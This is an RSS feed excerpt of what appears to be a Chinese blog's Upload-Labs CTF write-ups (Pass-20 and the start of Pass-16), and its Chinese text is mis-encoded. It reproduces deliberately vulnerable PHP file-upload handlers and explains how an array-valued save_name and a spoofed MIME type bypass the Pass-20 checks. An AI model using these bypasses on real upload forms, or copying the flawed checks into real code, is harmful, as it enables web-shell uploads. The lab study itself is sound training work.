&lt;p&gt;â€‹ å…¶å®è¿™é“é¢˜è¿˜æœ‰ä¸€ä¸ªæ€è·¯ï¼Œå› ä¸ºé¢˜ç›®ä½¿ç”¨äº†&lt;strong&gt;é»‘åå•éªŒè¯&lt;/strong&gt;ï¼Œåˆ†ææºç æ²¡æœ‰è®¾ç½®å¤§å°å†™è¿‡æ»¤ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ä½¿ç”¨å¤§å°å†™æ–¹æ³•é€šè¿‡å¦‚&lt;code&gt;Php&lt;/code&gt;ï¼Œä¸æ¼”ç¤ºäº†ã€‚&lt;/p&gt;
&lt;h2 id="pass-20"&gt;Pass-20
&lt;/h2&gt;&lt;p&gt;ï¼ˆLInuxç¯å¢ƒï¼Œphp7.2.21ï¼‰&lt;/p&gt;
&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;empty&lt;/span&gt;($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//æ£€æŸ¥MIME
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $allow_type &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;image/jpeg&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;image/png&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;image/gif&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;type&amp;#39;&lt;/span&gt;],$allow_type)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//æ£€æŸ¥æ–‡ä»¶å
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;empty&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;save_name&amp;#39;&lt;/span&gt;]) &lt;span style="color:#f92672"&gt;?&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;:&lt;/span&gt; $_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;save_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;is_array&lt;/span&gt;($file)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;explode&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;, &lt;span style="color:#a6e22e"&gt;strtolower&lt;/span&gt;($file));
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;end&lt;/span&gt;($file);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $allow_suffix &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;jpg&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;png&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;gif&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($ext, $allow_suffix)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;reset&lt;/span&gt;($file) &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; $file[&lt;span style="color:#a6e22e"&gt;count&lt;/span&gt;($file) &lt;span style="color:#f92672"&gt;-&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $temp_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt;$file_name;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($temp_file, $img_path)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â€‹ è¿™é“é¢˜ä½¿ç”¨äº†&lt;code&gt;MIME&lt;/code&gt;éªŒè¯å’Œç™½åå•éªŒè¯ã€‚å…ˆçœ‹ç¬¬10è¡Œä½¿ç”¨äº†&lt;code&gt;ä¸‰ç›®è¿ç®—ç¬¦&lt;/code&gt;åˆ¤æ–­&lt;code&gt;$_POST['save_name']&lt;/code&gt;æ˜¯å¦ä¸ºç©ºï¼Œè‹¥ä¸ºç©ºåˆ™æ‰§è¡Œ&lt;code&gt;:&lt;/code&gt;å‰è·å–ä¸Šä¼ æ–‡ä»¶çš„åç§°ï¼Œè‹¥ä¸ä¸ºç©ºåˆ™è·å–POSTä¸­çš„&lt;code&gt;save_name&lt;/code&gt;ã€‚ç¬¬11è¡Œä½¿ç”¨äº†&lt;code&gt;is_array&lt;/code&gt;å‡½æ•°åˆ¤æ–­æ˜¯å¦æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åä½¿ç”¨&lt;code&gt;explode&lt;/code&gt;æˆªæ–­æ–‡ä»¶åè½¬æ¢å°å†™å¹¶è¿”å›æ•°ç»„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬POSTä¸­çš„&lt;code&gt;save_name&lt;/code&gt;æ˜¯ä¸ªæ•°ç»„çš„å°±å¯ä»¥è·³è¿‡11è¡Œçš„åˆ¤æ–­ã€‚15è¡Œä½¿ç”¨&lt;code&gt;end&lt;/code&gt;å‡½æ•°è·å–æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ç”¨äºåç¼€éªŒè¯ã€‚20è¡ŒæŠŠæ–‡ä»¶åè¿›è¡Œæ‹¼æ¥ï¼šæ•°ç»„&lt;strong&gt;ç¬¬ä¸€ä¸ª&lt;/strong&gt;å…ƒç´ +æ•°ç»„å…ƒç´ &lt;strong&gt;æ€»æ•°-1&lt;/strong&gt;çš„é‚£ä¸ªå…ƒç´ ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªè¿™æ ·çš„æ•°ç»„ç”¨äºç»•è¿‡ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119170734.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ æ•°ç»„[2]ç”¨äºç»•è¿‡ç™½åå•ï¼Œæ–‡ä»¶åä¸ºï¼š&lt;code&gt;æ•°ç»„[0].æ•°ç»„[1]&lt;/code&gt;ï¼Œä½†æ˜¯æ•°ç»„[1]æ˜¯ç©ºçš„æ‰€ä»¥åªå‰©ä¸‹&lt;code&gt;æ•°ç»„[0].&lt;/code&gt;ï¼ˆåé¢æœ‰ä¸ªç‚¹ï¼‰&lt;/p&gt;
&lt;p&gt;â€‹ åˆ«å¿˜äº†è¿˜è¦ç»•è¿‡&lt;strong&gt;MIME&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119172340.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119172415.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;å®Œå·¥&lt;/p&gt;
&lt;h2 id="æœ€å"&gt;æœ€å
&lt;/h2&gt;&lt;p&gt;â€‹ Upload labsçš„20é“é¢˜å¤§éƒ¨åˆ†å®Œæˆäº†ï¼Œæœ‰ä¸¤é“é¢˜æ²¡å®Œæˆï¼Œä½†æ˜¯ä¹Ÿå­¦åˆ°äº†ä¸å°‘ä¸œè¥¿ï¼Œè¿™äº›å¤©å†æŠ½ç©ºå†™ä¸€ä¸ªæ€»ç»“å§ã€‚å°„å°„è§‚çœ‹ã€‚&lt;/p&gt;</description></item><item><title>Upload-Labsä¹‹Pass-16</title><link>/posts/ctf/upload-labs4/</link><pubDate>Mon, 16 Nov 2020 22:50:25 +0000</pubDate><guid>/posts/ctf/upload-labs4/</guid><description>&lt;h2 id="å‰è¨€"&gt;å‰è¨€
&lt;/h2&gt;&lt;p&gt;â€‹ æˆ‘åœ¨è¿™é“é¢˜ä¸ŠèŠ±äº†å¿«ä¸€å¤©çš„æ—¶é—´ï¼Œä½†æ˜¯ä¹Ÿå­¦åˆ°äº†ä¸å°‘å§¿åŠ¿ï¼Œè§‰å¾—ä¸œè¥¿åº”è¯¥è¶³å¤Ÿå¤šï¼Œè€Œä¸”å‚è€ƒäº†çš„åšå®¢å‘ç°è¿™é“é¢˜ç®—æ˜¯æœ‰æ­§ä¹‰çš„ï¼Œä¸çŸ¥é“ä½œè€…æƒ³è¦è€ƒå¯Ÿçš„ç‚¹æ˜¯å“ªä¸€ä¸ªï¼Œæ‰€ä»¥ç®—æ˜¯æœ‰ä¸¤ç§è§£æ³•å§ï¼Œå¯æƒœçš„æ˜¯ä¸¤ç§æ–¹æ³•éƒ½ä¸ç®—æ˜¯å¤§æˆåŠŸï¼Œåªæœ‰éƒ¨åˆ†æˆåŠŸæ‰§è¡Œäº†ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ å‚è€ƒåšå®¢ï¼š&lt;a class="link" href="https://xz.aliyun.com/t/2657#toc-4" target="_blank" rel="noopener"
&gt;upload-labsä¹‹pass 16è¯¦ç»†åˆ†æ&lt;/a&gt;&lt;/p&gt;
&lt;h2 id="pass-16"&gt;Pass-16
&lt;/h2&gt;&lt;p&gt;â€‹ æºç ï¼ˆä¸‰ç§å›¾ç‰‡çš„åˆ¤å®šï¼Œåªè´´ä¸€ä¸ªå§ï¼Œç¯‡å¹…å°ä¸€ç‚¹ï¼‰ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $filename &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $filetype &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;type&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $tmpname &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $target_path&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;basename&lt;/span&gt;($filename);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $fileext&lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;strrchr&lt;/span&gt;($filename,&lt;span style="color:#e6db74"&gt;&amp;#34;.&amp;#34;&lt;/span&gt;),&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(($fileext &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;jpg&amp;#34;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ($filetype&lt;span style="color:#f92672"&gt;==&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;image/jpeg&amp;#34;&lt;/span&gt;)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($tmpname,$target_path)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $im &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;imagecreatefromjpeg&lt;/span&gt;($target_path);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($im &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;@&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;unlink&lt;/span&gt;($target_path);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;srand&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;time&lt;/span&gt;());
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $newfilename &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strval&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;rand&lt;/span&gt;())&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;.jpg&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$newfilename;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;imagejpeg&lt;/span&gt;($im,$img_path);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;@&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;unlink&lt;/span&gt;($target_path);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;ä¸Šä¼ å‡ºé”™ï¼&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(($fileext &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;png&amp;#34;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ($filetype&lt;span style="color:#f92672"&gt;==&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;image/png&amp;#34;&lt;/span&gt;)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;......&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(($fileext &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;gif&amp;#34;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ($filetype&lt;span style="color:#f92672"&gt;==&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;image/gif&amp;#34;&lt;/span&gt;)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;.....&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â€‹ æç¤ºï¼š&lt;code&gt;æœ¬passé‡æ–°æ¸²æŸ“äº†å›¾ç‰‡ï¼&lt;/code&gt;ã€‚è¯´æ˜å¯¹å›¾ç‰‡è¿›è¡Œäº†äºŒæ¬¡æ¸²æŸ“ï¼Œæˆ‘çš„ç†è§£å°±æ˜¯æŠŠä¸Šä¼ çš„å›¾ç‰‡ï¼Œæ ¹æ®ä¸€äº›æ ‡å‡†ï¼ŒåªæŠŠå›¾ç‰‡ä¸­çš„å›¾ç‰‡ä¿¡æ¯æå–å‡ºæ¥ï¼Œå†ç”Ÿæˆä¸€ä¸ªå›¾ç‰‡ï¼Œå¯ä»¥æœ‰æ•ˆé¿å…å›¾ç‰‡é©¬ã€‚&lt;/p&gt;
